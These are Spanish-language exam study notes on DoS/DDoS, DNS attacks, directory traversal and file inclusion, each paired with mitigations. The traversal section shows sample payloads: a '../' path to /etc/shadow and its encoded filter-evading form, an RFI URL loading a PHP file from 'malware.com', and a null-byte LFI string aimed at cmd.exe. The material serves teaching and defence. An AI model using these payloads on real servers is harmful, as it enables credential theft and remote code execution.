# Actividad Maliciosa

En esta sección se estudian las **actividades maliciosas** y los principales **ciberataques** que afectan a personas, empresas y gobiernos. Debido a que las amenazas evolucionan constantemente y son cada vez más sofisticadas, comprender cómo funcionan es fundamental para prevenirlas y mitigarlas.

El objetivo es **analizar indicadores de actividad maliciosa (Indicators of Malicious Activity)**.

### Temas que se estudiarán

- **Ataques de Denegación de Servicio (DoS y DDoS):**
  - DoS.
  - DDoS.
  - DDoS por amplificación.
  - DDoS por reflexión.
  - Métodos de prevención y mitigación.

- **Ataques contra DNS:**
  - Envenenamiento de caché (DNS Cache Poisoning).
  - Amplificación DNS.
  - DNS Tunneling.
  - Secuestro de dominios (Domain Hijacking).
  - Transferencia de zona DNS (Zone Transfer Attacks).

- **Directory Traversal (Path Traversal):**
  - Explotación de una validación insuficiente de rutas o nombres de archivos para acceder a directorios restringidos.

- **Escalada de privilegios:**
  - Obtención de permisos superiores mediante la explotación de vulnerabilidades.

- **Ataques de repetición (Replay Attacks):**
  - Intercepción y retransmisión de comunicaciones válidas para realizar acciones fraudulentas.

- **Secuestro de sesión (Session Hijacking), Secuestro lateral de sesión/Secuestro de Cookies o Secuestro de Clave de sesión):**
  - Robo de sesiones activas para obtener acceso no autorizado.

- **Inyección de código malicioso:**
  - Inserción de código dañino en una aplicación o sistema para modificar su comportamiento.

- **Indicadores de Compromiso (IoCs):**
  - Bloqueos de cuentas.
  - Sesiones concurrentes inusuales.
  - Contenido bloqueado.
  - Viajes imposibles.
  - Consumo anormal de recursos.
  - Recursos inaccesibles.
  - Inicios de sesión fuera del horario habitual.
  - Mensajes indicando que el sistema fue comprometido.
  - Archivos de registro (logs) faltantes.

En la sección reforzaremos los conceptos y comprobar la comprensión de los distintos tipos de actividad maliciosa, sus mecanismos de ataque y los principales indicadores de compromiso.

# Ataques de Denegación de Servicio (DoS y DDoS)

Un **ataque de Denegación de Servicio (DoS)** es una categoría de ataques cuyo objetivo es **hacer que un servidor, computadora o dispositivo de red deje de estar disponible** para los usuarios legítimos, pero
también puede extenderse a dispositivos de red como conmutadores y enrutadores. Generalmente, esto se logra consumiendo todos los recursos del sistema.

## Tipos de ataques DoS

### • Ataque por inundación (Flood Attack)

Consiste en enviar una gran cantidad de solicitudes a un servidor hasta que no pueda responder.

#### • Ping Flood (ICMP Flood)

Ahora, un ping es técnicamente un paquete de solicitud de eco ICMP pero les gusta llamarlo ping en el exámen.

- Envía una gran cantidad de paquetes **ICMP Echo Request (ping)**, ping tambien es un comando y ICMP sería su protocolo
- Puede mitigarse bloqueando o limitando las respuestas/peticiones ICMP mediante el firewall.
- El resultado de la mitigación es que el atacante simplemente recibe un mensaje de tiempo de espera de la solicitud y el servidor permanece en línea y se detiene la denegación de servicio.

#### • SYN Flood

- El atacante envía múltiples paquetes **SYN** para iniciar conexiones TCP(múltiples sesiones TCP), pero nunca completa el **Three-Way Handshake**(apretón de manos a tres bandas).

Vamos a ver con ejemplo mas claro para que tengamos una idea de como funciona su conexión

Qué significa esto del: Three-Way Handshake (apretón de manos a tres bandas)

Es el proceso que usa TCP para crear una conexión.

Funciona así:

#### Paso 1 — SYN

El cliente dice:

  - "Hola servidor, quiero conectarme."

Cliente -------- SYN --------> Servidor

#### Paso 2 — SYN-ACK

El servidor responde:

  - "Perfecto, yo también estoy listo."

Cliente <----- SYN-ACK ------- Servidor

#### Paso 3 — ACK

El cliente confirma:

  - "Genial, ahora sí podemos comunicarnos."

Cliente -------- ACK --------> Servidor

A partir de ese momento la conexión queda establecida.

#### ¿Qué hace el atacante en un SYN Flood?

Hace solamente esto:

Cliente -------- SYN --------> Servidor

Cliente <----- SYN-ACK ------- Servidor

- Nunca envía el ACK (El ACK es simplemente el tercer mensaje que debería enviar el cliente para terminar de crear la conexión).

Entonces el servidor piensa:

"Bueno... voy a esperar un poco más."

Y reserva memoria para esa conexión.

El atacante vuelve a hacer lo mismo miles de veces:

SYN
SYN
SYN
SYN
SYN
SYN
SYN
SYN
...

El servidor sigue reservando memoria para cada conexión pendiente hasta que se queda sin recursos y deja de atender a usuarios legítimos.


- El servidor mantiene recursos reservados para conexiones incompletas hasta agotarlos. 

**Mitigación:**

- SYN Flood Protection en routers o firewalls.
- IPS (Intrusion Prevention System).
- Reducir el tiempo de espera (timeout) de conexiones semiabiertas. su servidor puede configurarse para que las peticiones medio abiertas se agoten después de un periodo de tiempo, digamos 10, 15 o 30 segundos, y
  esto liberará esos recursos y evitará que se produzca la denegación de servicio.
- Protectores contra inundaciones en la red (Flood Guars).

Esquema/Recorrido:

Antes de mostrar el esquema debemos tener en cuenta que el atacante no se conecta directamente al servidor (a menos que esté en la misma red, lo cual casi nunca ocurre).

El recorrido es:

Atacante
   ↓
Switch
   ↓
Router
   ↓
Internet
   ↓
Router del servidor
   ↓
Switch
   ↓
Servidor (victima)

---

### • Permanent Denial of Service (PDoS)

Ataque que explota vulnerabilidades para **corromper o sobrescribir el firmware** de un dispositivo. Es decir que se trata de un ataque que aprovecha un fallo de seguridad para
romper de forma permanente un dispositivo de red mediante la reinicialización de su firmware. Esto puede provocar que un dispositivo no pueda reiniciarse porque su sistema operativo se sobrescribe.

También se denomina ataque permanente de denegación de servicio porque un reinicio rápido no volverá a poner en línea el sistema. En su lugar, hay que desconectar el dispositivo, hacer una recarga completa del firmware
y volver a conectarlo.

---

### • Fork Bomb (Bomba de Horquilla)

Con una bomba de bifurcación, El atacante crea un gran número de procesos para utilizar la potencia de procesamiento disponible de un ordenador. Este ataque recibe su nombre
porque un proceso se llama bifurcación, y puede bifurcarse(se múltiplica) en dos procesos y luego en cuatro procesos y así sucesivamente hasta que consuma todos los recursos.

Ahora, algunas personas piensan en esto como un gusano debido a la naturaleza auto-replicante, pero no son un gusano porque no infectan programas y no utilizan
la red para propagarse.

En cambio, las bombas de bifurcación sólo se propagan dentro de la memoria caché del procesador en un único ordenador con el que se está atacando, y provoca un ataque de denegación de
servicio y una condición de denegación de servicio, razón por la que se considera que no es un gusano.

Descripciones:

- Crea procesos que se duplican continuamente hasta consumir toda la CPU y la memoria.
- Solo afecta al equipo donde se ejecuta.
- **No es un gusano**, porque no se propaga por la red.

---

# Ataque Distribuido de Denegación de Servicio (DDoS)

Un **DDoS (Distributed Denial of Service)** funciona igual que un DoS, pero utiliza **cientos o miles de equipos comprometidos (bots o zombis)** para atacar simultáneamente a un único servidor

## Características

- Utiliza una **botnet**.
- Los dispositivos infectados normalmente desconocen que participan en el ataque, cuando reciben esa orden de atacar, todas ellas envían
simultáneamente todas sus cargas útiles contra una única víctima.
- Es mucho más difícil de detener que un DoS tradicional.

---

## DNS Amplification Attack (Tipo especial de **DDoS**)

### Funcionamiento

1. El atacante falsifica (**IP Spoofing**) la dirección IP de la víctima.
2. Envía pequeñas consultas DNS a múltiples servidores DNS abiertos.
3. Los servidores responden con respuestas mucho más grandes.
4. Todas esas respuestas llegan a la víctima o a su servidor, saturando su ancho de banda (cantidad máxima de datos que una red puede transmitir por segundo).

> Una consulta DNS pequeña genera una respuesta mucho mayor (**amplificación**), aumentando enormemente el volumen del ataque.

El servidor DNS cree que la petición proviene realmente de la víctima y le envía la respuesta.

El problema es que:

La petición ocupa muy pocos datos.
La respuesta DNS suele ser mucho más grande.

Por eso, una pequeña petición genera una respuesta mucho mayor, amplificando el tráfico enviado a la víctima.

---

# Ejemplo real

En **marzo de 2018**, GitHub sufrió uno de los mayores ataques DDoS registrados.

- Aproximadamente **1.35 Tbps** de tráfico.
- El servicio estuvo fuera de línea durante **5 minutos**.

---

# Mitigación de DoS y DDoS

## • Blackholing (Sinkholing)

- Identifica las IP atacantes.
- Redirige su tráfico hacia una interfaz nula ("agujero negro").
- Es una solución temporal. Porque desgraciadamente, los atacantes pueden trasladarse a una nueva IP y reiniciar el ataque de nuevo, por lo que ésta es sólo una solución temporal.

---

## • IPS (Intrusion Prevention System)

- Detecta y bloquea ataques DoS.
- Es efectivo para ataques pequeños o medianos.
- Puede no ser suficiente frente a un DDoS masivo.

---

## • Infraestructura en la nube elástica (Eficaz pero más caro)

- Escala automáticamente los recursos cuando aumenta el tráfico.
- Permite soportar grandes volúmenes de solicitudes.
- Su desventaja es el incremento del costo durante el ataque. Esta estrategia es que la mayoría de los proveedores de servicios te van a cobrar en función
de la capacidad y los recursos que hayas utilizado, y no estás obteniendo un retorno de esta inversión porque este tráfico fue todo desperdiciado.

---

"Así que hay algunos proveedores de nube especializados que han aceptado este reto. Empresas como CloudFlare y Akamai están diseñadas para
ayudarle a capear estos ataques DDoS".

## • Servicios Anti-DDoS (Eficaz)

Ejemplos:

- Cloudflare
- Akamai

Estos servicios ofrecen:

- Filtrado del tráfico malicioso a aplicaciones web y distribución de contenidos en nombre de su organización.
- CDN (Content Delivery Network).
- Protección contra ataques de gran volumen.
- Alta disponibilidad.
- Defensa en múltiples capas del modelo OSI.

Estos proveedores de servicios se centran en asegurar que usted tiene redes altamente robustas y altamente disponibles que
pueden asegurar que pueden escribir estos ataques DDoS y estos ataques de gran ancho de banda.

Esto también le dará defensas adicionales en capas a través de su modelo OSI. Ayudará a proporcionarle protecciones adicionales.

---

# Resumen para examen

- **DoS:** un único equipo intenta dejar fuera de servicio a la víctima.
- **DDoS:** cientos o miles de equipos (botnet) atacan simultáneamente a la misma víctima.
- **Flood Attack:** satura un sistema enviando enormes cantidades de tráfico.
- **Ping Flood:** inundación de paquetes ICMP.
- **SYN Flood:** conexiones TCP incompletas consumen los recursos del servidor.
- **PDoS:** corrompe el firmware y deja inutilizable un dispositivo.
- **Fork Bomb:** crea procesos infinitos hasta consumir CPU y memoria.
- **DNS Amplification:** amplifica el ataque utilizando respuestas DNS mucho mayores que las consultas.
- **Mitigaciones:** Firewall, IPS, SYN Flood Protection, Blackholing/Sinkholing, infraestructura elástica y servicios especializados como Cloudflare o Akamai.

#### Otro conceoto es:
IP Spoofing: IP falsas (utilizada para inundar el servidor), en si no es tan relevante como los conceptos de exámen visto anteriormente, pero es para tenerlo en cuenta

# Ataques al Sistema de Nombres de Dominio (DNS)

## ¿Qué es el DNS?

El **Sistema de Nombres de Dominio (DNS)** traduce los **nombres de dominio** (ej. google.com) en **direcciones IP**, permitiendo que los dispositivos encuentren el servidor correcto. Debido a que es un servicio esencial de Internet, es un objetivo frecuente de los ciberataques.

---

# Tipos de ataques DNS

## 1. Envenenamiento de caché DNS (DNS Cache Poisoning / DNS Spoofing)

Consiste en **modificar la caché de un servidor DNS** con información falsa para que redirija a los usuarios hacia una **dirección IP controlada por un atacante**. Por ejemplo, un atacante podría envenenar la caché DNS de un sitio web popular de banca en línea y luego
hacer que los usuarios del banco sean redirigidos a un sitio web falso donde sus credenciales de acceso 
podrían ser robadas por los atacantes.

### Objetivo
- Redirigir a los usuarios a sitios web falsos.
- Robar credenciales o distribuir malware.

### Mitigación
- Implementar **DNSSEC** para verificar la autenticidad e integridad de los registros DNS, o las extensiones de seguridad del Sistema de Nombres de Dominio para añadir firmas
digitales a los datos DNS de su organización
- Proteger los servidores DNS con **firewalls** y configuraciones seguras.

---

## 2. Ataque de amplificación DNS (DNS Amplification)

Es un tipo de **ataque DDoS** donde el atacante envía **consultas DNS pequeñas** utilizando la **dirección IP falsificada de la víctima**.

El servidor DNS responde con mensajes mucho más grandes hacia la víctima, saturando su ancho de banda y provocando una denegación de servicio.

### Mitigación
- Limitar el tamaño de las respuestas DNS.
- Aplicar **Rate Limiting** (limitación de tasa) al tráfico DNS.

---

## 3. Tunelización DNS (DNS Tunneling)

Consiste en utilizar el **protocolo DNS (puerto 53)** para transportar tráfico que normalmente no sería DNS (como HTTP o SSH).

Aunque es una técnica legítima, los atacantes la utilizan para:

- Evadir las reglas del firewall con fin de establecer canales de **Comando y Control (C2)**. o tambien filtrar datos de una organización.

### Mitigación

- Monitorear y analizar los **logs/registros DNS**.
- Detectar consultas DNS anómalas o patrones inusuales.

---

## 4. Secuestro de dominios (Domain Hijacking)

También conocido como **robo de dominios**.

Consiste en modificar el registro de un dominio sin autorización, permitiendo que el atacante tome el control del sitio web o redirija a los usuarios hacia una página maliciosa.

### Mitigación

- Proteger la cuenta del registrador del dominio.
- Mantener actualizada la información de la cuenta.
- Utilizar **Domain Registry Lock** para impedir modificaciones no autorizadas.

---

## 5. Ataque de transferencia de zona DNS (DNS Zone Transfer Attack)

El atacante intenta obtener una **copia completa de la zona DNS**, que contiene todos los registros del dominio.

Este tipo de ataque puede exponer información sensible sobre la infraestructura de red del dominio y podría utilizarse como **"Reconocimiento"** para preparar futuros ataques contra la organización.

### Mitigación
- Permitir transferencias de zona únicamente entre servidores autorizados.
- Restringir y autenticar las solicitudes de transferencia.

---

# Resumen

| Ataque | Objetivo | Mitigación |
|---------|----------|------------|
| **Envenenamiento de caché DNS** | Redirigir usuarios a sitios falsos | DNSSEC, firewalls y servidores DNS seguros |
| **Amplificación DNS** | Saturar a la víctima mediante respuestas DNS (DDoS) | Limitar respuestas y aplicar Rate Limiting |
| **Tunelización DNS** | Evadir el firewall y exfiltrar datos | Monitorear y analizar los logs DNS |
| **Secuestro de dominios** | Tomar el control de un dominio | Proteger el registrador y usar Domain Registry Lock |
| **Transferencia de zona DNS** | Obtener información de la infraestructura DNS | Restringir y autenticar las transferencias de zona |

---

# Idea clave

Los ataques DNS buscan **interrumpir servicios, redirigir tráfico o robar información** explotando vulnerabilidades del Sistema de Nombres de Dominio.

Las principales medidas de defensa incluyen:

- Implementar **DNSSEC**.
- Proteger los servidores DNS con **firewalls**.
- Monitorear continuamente los **logs DNS**.
- Limitar el tráfico de respuestas DNS.
- Restringir las transferencias de zona.
- Proteger las cuentas de registro de dominios.

Así que recuerde, los ataques DNS aprovechan las vulnerabilidades del Sistema de Nombres de Dominio para interrumpir el servicio, robar información o redirigir el tráfico de un sitio web.

El envenenamiento de la caché DNS consiste en corromper la caché de un resolutor DNS.

Los ataques de amplificación de DNS utilizan el proceso de resolución de DNS para inundar un objetivo con tráfico y crear una situación de denegación de servicio.

La tunelización DNS puede utilizarse para eludir las reglas del cortafuegos y llevar a cabo la exfiltración de datos.

El secuestro de dominios implica cambios no autorizados en el registro de un dominio. Y el ataque de transferencia de zona DNS tiene como objetivo obtener una
copia de los datos de la zona DNS de un dominio.

Comprendiendo cómo actúan estos ataques se pueden establecer fácilmente mecanismos para evitar que se produzcan.

# Ataques de Directory Traversal e Inclusión de Archivos

## ¿Qué es un Directory Traversal?

Es un **ataque de inyección** donde un atacante manipula la URL o los parámetros de una aplicación web para acceder a **archivos y directorios fuera de la carpeta raíz (Web Root)**.

Su objetivo es **leer archivos sensibles** o **ejecutar archivos del sistema**.

### Ejemplo

Estructura del servidor:

```text
/
├── etc
│   └── shadow
└── home
    └── programs
        └── www_root
            └── index.php
```

Si el atacante escribe:

```text
https://sitio.com/../../../etc/shadow
```

Los `../` hacen que el sistema suba directorios hasta llegar a:

```text
/etc/shadow
```

Si el servidor está mal configurado, el atacante podrá leer ese archivo.

---

### ¿Qué significa `../`?

```text
../
```

Significa:

> "Sube un nivel en la estructura de carpetas."

Ejemplo:

Directorio actual:

```text
/home/programs/www_root
```

Con:

```text
../
```

queda:

```text
/home/programs
```

Otro `../`

```text
/home
```

Otro:

```text
/
```

Luego puede entrar a cualquier carpeta:

```text
/etc
```

---

### ¿Por qué es peligroso?

Porque puede permitir acceder a:

- Archivos de contraseñas.
- Archivos de configuración.
- Claves privadas.
- Bases de datos.
- Scripts del servidor.
- Otros archivos sensibles.

Todo depende de los permisos configurados en el servidor.

---

### Linux vs Windows

En Linux:

```text
../
```

usa la barra:

```text
/
```

En Windows normalmente se usa:

```text
..\
```

Aunque muchos servidores aceptan ambas.

---

### ¿Cómo ocultan el ataque?

En lugar de escribir:

```text
../
```

pueden codificarlo como:

```text
%2e%2e%2f
```

donde:

```text
%2e = .
%2f = /
```

Por lo tanto:

```text
%2e%2e%2f
```

equivale a:

```text
../
```

Esto ayuda a evadir algunos filtros de seguridad.

---

## Inclusión de Archivos (File Inclusion)

Es una vulnerabilidad donde el atacante consigue que la aplicación cargue un archivo que no debería.

Existen dos tipos:

- Remote File Inclusion (RFI)
- Local File Inclusion (LFI)

---

## 1. Remote File Inclusion (RFI)

El atacante hace que el servidor cargue un archivo ubicado **en otro servidor de Internet**.

Ejemplo:

```text
https://sitio.com/login.php?user=http://malware.com/malicioso.php
```

En lugar de cargar un usuario válido, intenta que el servidor ejecute:

```text
malicioso.php
```

que está alojado en otro sitio web.

### Objetivo

- Ejecutar malware.
- Instalar una backdoor (puerta trasera).
- Tomar control del servidor.

---

## 2. Local File Inclusion (LFI)

Aquí el archivo **ya existe dentro del servidor**.

El atacante utiliza un **Directory Traversal** para llegar hasta él.

Ejemplo:

```text
https://sitio.com/login.php?user=../../../Windows/System32/cmd.exe%00
```

Está intentando ejecutar:

```text
cmd.exe
```

que ya existe en el servidor Windows.

---

### ¿Qué significa `%00`?

```text
%00
```

Es un **carácter nulo (Null Byte)**.

Antes se utilizaba para engañar a algunas aplicaciones.

Ejemplo:

La aplicación esperaba:

```text
archivo.php
```

El atacante enviaba:

```text
cmd.exe%00
```

Algunos programas antiguos dejaban de leer la cadena en `%00`, ignorando el `.php` agregado automáticamente y permitiendo ejecutar `cmd.exe`.

---

### Diferencia entre RFI y LFI

| Remote File Inclusion (RFI) | Local File Inclusion (LFI) |
|-----------------------------|----------------------------|
| Carga un archivo desde otro servidor. | Usa un archivo que ya existe en el servidor. |
| Requiere una URL externa. | Utiliza rutas locales. |
| Se utiliza para ejecutar malware remoto. | Se utiliza para acceder o ejecutar archivos locales. |

---

### ¿Cómo prevenir estos ataques?

- Validar y sanitizar todas las entradas del usuario.
- No permitir rutas arbitrarias.
- Restringir el acceso únicamente al **Web Root**.
- Configurar correctamente los permisos de archivos y carpetas.
- Deshabilitar la inclusión de archivos remotos cuando no sea necesaria.
- Filtrar secuencias como `../` y sus versiones codificadas (`%2e%2e%2f`).

---

### Para el examen (muy importante)

✅ Si ves:

```text
../
```

o

```text
..\
```

Piensa inmediatamente en:

> **Directory Traversal**

También recuerda:

> **Local File Inclusion (LFI)** normalmente utiliza **Directory Traversal** para llegar al archivo que quiere cargar.

---

### Esquema para memorizar

```text
Directory Traversal
        │
        ▼
Permite salir del Web Root usando ../
        │
        ▼
Accede a archivos sensibles
        │
        ▼
Puede utilizarse en ataques de Local File Inclusion


Remote File Inclusion (RFI)
        │
        ▼
Carga un archivo desde otro servidor.


Local File Inclusion (LFI)
        │
        ▼
Carga un archivo que ya existe en el servidor.
```

### Resumen rápido

- **Directory Traversal:** utiliza `../` para salir del Web Root y acceder a otros directorios.
- **RFI:** carga un archivo remoto desde otro servidor.
- **LFI:** carga un archivo local que ya existe en el servidor.
- **`%2e%2e%2f`:** versión codificada de `../`.
- **`%00`:** carácter nulo usado antiguamente para evadir algunos mecanismos de seguridad.
